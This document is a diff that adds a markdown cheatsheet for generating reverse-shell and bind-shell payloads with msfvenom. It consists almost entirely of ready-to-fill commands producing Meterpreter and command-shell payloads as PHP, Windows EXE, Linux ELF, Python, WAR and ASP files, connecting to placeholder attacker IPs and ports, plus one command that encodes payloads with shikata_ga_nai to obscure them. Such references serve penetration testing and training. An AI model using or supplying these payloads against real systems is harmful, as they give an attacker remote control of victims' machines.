@@ -1,0 +1,139 @@
+## Reverse Shell with Msfvenom - Cheatsheet
+
+### List payloads
+
+{% highlight Shell %}
+
+```Shell
+
+msfvenom -l
+```
+
+{% endhighlight %}
+
+Or
+
+{% highlight Shell %}
+
+```Shell
+
+msfvenom --list payloads
+```
+
+{% endhighlight %}
+
+### Generate a PHP payload
+
+{% highlight Shell %}
+
+```Shell
+
+msfvenom -p php/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php
+```
+
+{% endhighlight %}
+
+### Generate a Windows payload
+
+##### Meterpreter - Reverse shell (x64):
+
+{% highlight Shell %}
+
+```Shell
+
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > reverse.exe
+```
+
+{% endhighlight %}
+
+##### Meterpreter - Reverse shell:
+
+{% highlight Shell %}
+
+```Shell
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Attacker_IP> LPORT=<Attacker_PORT> -f exe > reverse.exe
+```
+
+{% endhighlight %}
+
+##### Meterpreter - Bind shell:
+
+{% highlight Shell %}
+
+```Shell
+
+msfvenom -p windows/meterpreter/bind_tcp RHOST=<Target_IP> LPORT=<Target_Port> -f exe > bind.exe
+```
+
+{% endhighlight %}
+
+##### CMD - Reverse shell:
+
+{% highlight Shell %}
+
+```Shell
+
+msfvenom -p windows/shell/reverse_tcp LHOST=<Attacker_IP> LPORT=<Attacker_port> -f exe > prompt.exe
+```
+
+{% endhighlight %}
+
+### Generate a Linux payload
+
+##### Meterpreter - Reverse shell:
+
+{% highlight Shell %}
+
+```Shell
+
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Attacker_IP> LPORT=<Attacker_port> -f elf > reverse_bin
+```
+
+{% endhighlight %}
+
+### Generate a Python payload
+
+{% highlight Shell %}
+
+```Shell
+
+msfvenom -p cmd/unix/reverse_python LHOST=<Attacker_IP> LPORT=<Attacker_port> -f raw > reverse.py
+```
+
+{% endhighlight %}
+
+### Generate a WAR payload
+
+{% highlight Shell %}
+
+```Shell
+
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Attacker_IP> LPORT=<Attacker_port> -f war > payload.war
+```
+
+{% endhighlight %}
+
+### Generate an ASP payload
+
+{% highlight Shell %}
+
+```Shell
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Attacker_IP> LPORT=<Attacker_PORT> -f asp > reverse.asp
+```
+
+{% endhighlight %}
+
+### Generate encoded payloads
+
+##### Shikata\_ga\_nai
+
+{% highlight Shell %}
+
+```Shell
+
+msfvenom -p <PAYLOAD> -e shikata_ga_nai -i 5 -f raw > reverse
+```
+
+{% endhighlight %}
